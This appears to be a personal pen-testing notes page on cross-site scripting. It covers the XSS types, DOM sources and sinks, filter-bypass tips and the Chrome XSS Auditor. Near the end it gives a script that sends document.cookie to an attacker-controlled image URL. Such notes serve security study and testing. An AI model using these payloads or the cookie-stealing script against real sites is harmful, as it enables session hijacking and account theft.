# XSS - Cross-Site Scripting

## Types

### Reflected

* The input is sent to the server and reflected on the page

### Stored

* Same but the input is also persisted in a db of some sort

### DOM

* The input is directly inserted into the DOM \(without being sent to the server at all\)
* **Sources** \(where the input goes\) :
  * `document.url`
  * `document.referrer`
  * `location`
  * `location.href`
  * `location.search`
  * `location.hash`
  * `location.pathname`
  * etc
* **Sinks** \(where the input ends up\) :
  * `element.innerHTML()`
  * `element.outerHTML()`
  * `eval()`
  * `setTimeout()`
  * `setInterval()`
  * `document.write()`
  * `document.writeln()`
  * etc
* A `<script>alert();</script>` inserted via `inner.html` won't be executed

### Polygots

XSS payloads made from a mixture of encoding/repetition/comments/etc that make it possible to pass filter/black list/etc. They're hard to read.

## Tips

* Check which chars are escaped by using them with an easily recognizable safe string
* Use lists with _burp intruder_
* If `<script>` aren't accepted, use events like `onfocus`, `onload`, etc
* Other places for xss :
  * Concatenated http parameter pollution
  * Url of action form : `javascript:alert(1337)`
  * Url : `data:text/html,<script>alert(0)</script>`
* `google.com/jsapi?callback=alert` can be used to received a function in a callback
* Check : [Bypassing Sanitizers](https://zcugni.gitbook.io/notes/pen-test/vulnerabilities#bypassing-sanitizers) & the [Owasp Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

## XSS Auditor

* Exist in Chrome, not in Firefox and I don't know for the rest
* Broadly speaking, it detects XSS injection by comparing what is given in the url with the scripts of the page
* Because of that, we can inject in the url a script that's a normal part of the page to disable it
* Might soon disappear because it create vulnerabilities and gives a false impression of security to devs

## Get a cookie with that

By example by injecting this script :

```javascript
<script>
    document.write("<img src='...'?c="+document.cookie+"'/>");
</script>
```

The img will be added to the page and request it's source \(the attacker website\) with the cookie attached to it.

## Sources

* [Owasp testing guide v4](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf)
* PwnFunction's [video](https://www.youtube.com/watch?v=EoaDgUgS6QA)
* [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)'s multiple videos
* Misc research

